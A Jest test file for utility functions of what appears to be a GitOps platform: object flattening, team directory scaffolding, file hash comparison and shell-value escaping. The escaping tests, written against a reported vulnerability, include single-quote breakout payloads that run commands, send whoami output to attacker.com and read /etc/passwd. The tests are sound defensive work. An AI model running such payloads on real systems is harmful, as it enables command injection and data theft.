import * as utils from './utils'
import * as fsUtils from 'fs/promises'
import { readFile } from 'fs/promises'
import * as debugTools from './debug'

describe('Flatten objects', () => {
  it('should be flattened', () => {
    const obj = {
      '1': {
        '2': {
          '3': {
            hello: 'world',
            abc: 'def',
            arr: [1, 2, 3],
          },
        },
      },
    }
    const expectingFlattenedObject = {
      '1.2.3.hello': 'world',
      '1.2.3.abc': 'def',
      '1.2.3.arr': [1, 2, 3],
    }
    const flattened = utils.flattenObject(obj)
    expect(flattened).toEqual(expectingFlattenedObject)
  })
})

describe('ensureTeamGitopsDirectories', () => {
  it('should create .gitkeep files in all team directories when AI is enabled', async () => {
    const envDir = '/values'
    const values = { otomi: { aiEnabled: true } }
    const deps: any = {
      writeFile: jest.fn(),
      glob: jest.fn().mockResolvedValue(['/values/env/teams/team1', '/values/env/teams/team2']),
    }
    const result = await utils.ensureTeamGitOpsDirectories(envDir, values, deps)
    expect(deps.glob).toHaveBeenCalledWith(`${envDir}/env/teams/*`)
    expect(result).toEqual([
      '/values/env/teams/team1/sealedsecrets/.gitkeep',
      '/values/env/teams/team1/workloadValues/.gitkeep',
      '/values/env/teams/team1/databases/.gitkeep',
      '/values/env/teams/team1/knowledgebases/.gitkeep',
      '/values/env/teams/team1/agents/.gitkeep',
      '/values/env/teams/team2/sealedsecrets/.gitkeep',
      '/values/env/teams/team2/workloadValues/.gitkeep',
      '/values/env/teams/team2/databases/.gitkeep',
      '/values/env/teams/team2/knowledgebases/.gitkeep',
      '/values/env/teams/team2/agents/.gitkeep',
    ])
  })

  it('should only create base .gitkeep files when AI is disabled', async () => {
    const envDir = '/values'
    const values = { otomi: { aiEnabled: false } }
    const deps: any = {
      writeFile: jest.fn(),
      glob: jest.fn().mockResolvedValue(['/values/env/teams/team1', '/values/env/teams/team2']),
    }
    const result = await utils.ensureTeamGitOpsDirectories(envDir, values, deps)
    expect(deps.glob).toHaveBeenCalledWith(`${envDir}/env/teams/*`)
    expect(result).toEqual([
      '/values/env/teams/team1/sealedsecrets/.gitkeep',
      '/values/env/teams/team1/workloadValues/.gitkeep',
      '/values/env/teams/team2/sealedsecrets/.gitkeep',
      '/values/env/teams/team2/workloadValues/.gitkeep',
    ])
  })

  it('should only create base .gitkeep files when aiEnabled is not set', async () => {
    const envDir = '/values'
    const values = {}
    const deps: any = {
      writeFile: jest.fn(),
      glob: jest.fn().mockResolvedValue(['/values/env/teams/team1']),
    }
    const result = await utils.ensureTeamGitOpsDirectories(envDir, values, deps)
    expect(deps.glob).toHaveBeenCalledWith(`${envDir}/env/teams/*`)
    expect(result).toEqual([
      '/values/env/teams/team1/sealedsecrets/.gitkeep',
      '/values/env/teams/team1/workloadValues/.gitkeep',
    ])
  })
})

describe('escapeGucciValue', () => {
  it('returns the value as a string', () => {
    expect(utils.escapeGucciValue('hello')).toBe('hello')
  })

  it('returns an empty string for null', () => {
    expect(utils.escapeGucciValue(null)).toBe('')
  })

  it('returns an empty string for undefined', () => {
    expect(utils.escapeGucciValue(undefined)).toBe('')
  })

  it('does not alter values without single quotes', () => {
    expect(utils.escapeGucciValue('safe-value_123')).toBe('safe-value_123')
  })

  it('converts numbers to strings', () => {
    expect(utils.escapeGucciValue(42)).toBe('42')
  })

  // Payloads from KMS publicKey single-quote breakout security report
  it('does not return the raw injection payload unchanged', () => {
    const payload = "';id>/tmp/proof&&curl attacker.com/$(whoami);'"
    expect(utils.escapeGucciValue(payload)).not.toBe(payload)
  })

  it('prevents KMS publicKey single-quote breakout', () => {
    // Without escaping this produces: -s keys='';id>/tmp/proof&&curl attacker.com/$(whoami);''
    // The '' closes the single-quoted arg, letting ;id>... execute as a shell command.
    // Each ' must become '\'' so the value remains inside a quoted context.
    const payload = "';id>/tmp/proof&&curl attacker.com/$(whoami);'"
    expect(utils.escapeGucciValue(payload)).toBe(`'\\'';id>/tmp/proof&&curl attacker.com/$(whoami);'\\''`)
  })

  it('prevents subshell command substitution breakout via publicKey', () => {
    // Variant using $() inside the single-quote breakout
    const payload = "';curl $(cat /etc/passwd|base64);'"
    expect(utils.escapeGucciValue(payload)).toBe(`'\\'';curl $(cat /etc/passwd|base64);'\\''`)
  })
})

jest.mock('fs/promises', () => ({
  readFile: jest.fn(),
}))
describe('hasFileDifference', () => {
  jest.mock('crypto')
  jest.isMockFunction(fsUtils.readFile)
  const debug = jest.spyOn(debugTools, 'terminal')
  afterEach(() => {
    jest.clearAllMocks()
  })

  it('returns false when file hashes are equal', async () => {
    ;(readFile as jest.Mock).mockResolvedValue('content-A')

    const result = await utils.hasFileDifference('fileA.txt', 'fileB.txt')

    expect(result).toBe(false)
  })

  it('returns true when file hashes differ', async () => {
    ;(readFile as jest.Mock).mockResolvedValueOnce('content-A')
    ;(readFile as jest.Mock).mockResolvedValueOnce('content-B')

    const result = await utils.hasFileDifference('fileA.txt', 'fileB.txt')

    expect(result).toBe(true)
  })

  it('returns true and logs an error if readFile throws', async () => {
    ;(readFile as jest.Mock).mockRejectedValueOnce(new Error('Failed to read file'))
    const result = await utils.hasFileDifference('fileA.txt', 'fileB.txt')

    expect(result).toBe(true)
    expect(debug).toHaveBeenCalled()
  })
})
